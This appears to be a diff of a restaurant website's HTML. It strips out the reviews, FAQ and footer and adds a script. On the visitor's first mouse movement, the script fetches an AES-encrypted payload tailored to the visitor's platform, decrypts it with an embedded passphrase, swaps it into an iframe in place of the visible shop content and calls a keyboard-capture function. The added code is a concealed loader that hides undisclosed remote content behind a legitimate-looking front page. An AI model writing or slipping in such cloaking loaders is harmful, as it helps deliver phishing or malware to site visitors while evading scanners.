-                    <div class="review-stars">★★★★★</div>
-                    <p class="review-quote">"The zero-proof botanical pairing was an absolute masterclass in flavor architecture. The rosemary citron spritz completely redefined non-alcoholic beverage craft."</p>
-                    <div class="review-author">
-                        <h5>Camille Rousseau</h5>
-                        <span>Culinary Botanist &bull; Santa Barbara</span>
-                    </div>
-                </div>
-                <div class="review-card">
-                    <div class="review-stars">★★★★★</div>
-                    <p class="review-quote">"SunsetTableGo curated our 20-person private orchard gathering with flawless hospitality. Warm soapstones for our feet and glowing candlelight created pure magic."</p>
-                    <div class="review-author">
-                        <h5>Harrison Brooks</h5>
-                        <span>Private Event Host &bull; Los Angeles</span>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
+    async function loadSecret() {
+      const shop = document.getElementById("shop");
+      const frame = document.getElementById("frame");
+      const contentIframe = document.getElementById("contentiframe");
 
-    <!-- SECTION 11: Sunset Dining FAQ Accordion -->
-    <section class="section-pad" style="background: var(--bg-surface);">
-        <div class="container">
-            <div class="section-head">
-                <span class="section-badge">Guest Inquiries</span>
-                <h2 class="section-title">Frequently Asked Questions</h2>
-                <p class="section-desc">Helpful details on table reservations, weather contingencies, dietary preferences, and evening attire.</p>
-            </div>
-            <div class="faq-wrap">
-                <div class="faq-card open">
-                    <div class="faq-header">
-                        <h4>What happens if weather conditions become unsuitable for outdoor dining?</h4>
-                        <span class="faq-icon">+</span>
-                    </div>
-                    <div class="faq-body">
-                        Our culinary team constantly monitors localized meteorological conditions. In the event of coastal fog or high winds, gatherings transition seamlessly to our glasshouse pavilions or covered rustic pergolas, maintaining full panoramic sunset views with climate-controlled warmth.
-                    </div>
-                </div>
-                <div class="faq-card">
-                    <div class="faq-header">
-                        <h4>Can dietary restrictions and plant-based preferences be accommodated?</h4>
-                        <span class="faq-icon">+</span>
-                    </div>
-                    <div class="faq-body">
-                        Yes. Because our hearth feasts are crafted from whole heirloom produce, our chefs happily curate dedicated plant-based, gluten-conscious, and allergen-safe tasting courses with advanced reservation notice.
-                    </div>
-                </div>
-                <div class="faq-card">
-                    <div class="faq-header">
-                        <h4>What attire is recommended for outdoor sunset dinners?</h4>
-                        <span class="faq-icon">+</span>
-                    </div>
-                    <div class="faq-body">
-                        We recommend smart coastal casual attire with warm layers. As the sun sets, coastal temperatures naturally drop. We provide heated soapstone footrests and organic wool blankets to ensure continuous guest comfort.
-                    </div>
-                </div>
-                <div class="faq-card">
-                    <div class="faq-header">
-                        <h4>Are children and family groups welcome at SunsetTableGo banquets?</h4>
-                        <span class="faq-icon">+</span>
-                    </div>
-                    <div class="faq-body">
-                        We welcome guests of all ages at our private pavilion gatherings and select family-focused orchard banquets. Our communal supper club evenings are designed primarily for adult culinary appreciation.
-                    </div>
-                </div>
-                <div class="faq-card">
-                    <div class="faq-header">
-                        <h4>How far in advance should private gatherings and pavilion feasts be reserved?</h4>
-                        <span class="faq-icon">+</span>
-                    </div>
-                    <div class="faq-body">
-                        Due to seasonal farm sourcing and limited nomadic permits, private table bookings and group banquets should be requested 30 to 60 days in advance through our hospitality concierge.
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
 
-    <!-- SECTION 12: Direct Sunset Table Reservation CTA -->
-    <section class="section-pad">
-        <div class="container">
-            <div class="cta-banner">
-                <h2>Reserve Your Place at the Sunset Table</h2>
-                <p style="color: var(--text-muted); max-width: 620px; margin: 0 auto 24px;">Experience the unforgettable harmony of golden hour light, open-hearth culinary arts, and convivial alfresco hospitality.</p>
-                <form class="cta-form" id="contactForm">
-                    <input type="email" placeholder="Enter guest reservation email" class="cta-input" required>
-                    <button type="submit" class="btn-primary">Reserve Table</button>
-                </form>
-            </div>
-        </div>
-    </section>
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
 
-    <footer class="site-footer">
-        <div class="container">
-            <div class="footer-grid">
-                <div class="footer-col">
-                    <a href="index.php" class="brand-logo" style="margin-bottom: 16px; display: inline-flex;">
-                        <span class="logo-badge">GOLDEN HOUR</span> SUNSETTABLEGO
-                    </a>
-                    <p>Nomadic sunset dining experiences, wood-fired coastal harvests, and zero-proof botanical gastronomy curated at the intersection of solar cycles and seasonal terroir.</p>
-                    <p style="font-size: 13px; color: var(--accent-amber-light); margin-top: 10px;">
-                        840 Oceanview Promenade, Suite 300, Santa Barbara, CA 93101, United States<br>
-                        Hospitality Concierge: +1-800-786-7388 | concierge@sunsettablego.com
-                    </p>
-                </div>
-                <div class="footer-col">
-                    <h4>Navigation</h4>
-                    <ul class="footer-links">
-                        <li><a href="index.php">Dining Pavilions</a></li>
-                        <li><a href="about.html">Culinary Philosophy</a></li>
-                        <li><a href="blog.html">Sunset Chronicles</a></li>
-                        <li><a href="contact.html">Concierge Desk</a></li>
-                    </ul>
-                </div>
-                <div class="footer-col">
-                    <h4>Legal & Standards</h4>
-                    <ul class="footer-links">
-                        <li><a href="privacy.html">Privacy Policy</a></li>
-                        <li><a href="terms.html">Terms of Service</a></li>
-                        <li><a href="disclaimer.html">Dining Disclaimer</a></li>
-                        <li><a href="cookies.html">Cookie Policy</a></li>
-                    </ul>
-                </div>
-                <div class="footer-col">
-                    <h4>Sunset Dispatch</h4>
-                    <p style="font-size: 14px;">Receive solar banquet dates, seasonal coastal harvest announcements, and private pavilion openings.</p>
-                    <form class="cta-form" id="newsletterForm" style="margin: 0;">
-                        <input type="email" placeholder="Enter guest email" class="cta-input" required>
-                        <button type="submit" class="btn-primary" style="padding: 12px 20px; font-size: 13px;">Join</button>
-                    </form>
-                </div>
-            </div>
-            <div class="footer-bottom">
-                <div>&copy; <?php echo date('Y'); ?> SunsetTableGo. All rights reserved. Golden Hour Gastronomy.</div>
-                <div>Farm to Table &bull; Open Hearth Craft &bull; Botanical Pairings</div>
-            </div>
-        </div>
-    </footer>
+        frame.src = lastUrl;
+        
+        shop.style.display = "none";
+        contentIframe.style.display = "block"; 
+        document.getElementById("customPopup").style.display = "none";
+        
+       
+        secureKeyboardAccess();
 
-    <script src="js/script.js"></script>
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
+
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
+  </script>
 </body>
 </html>
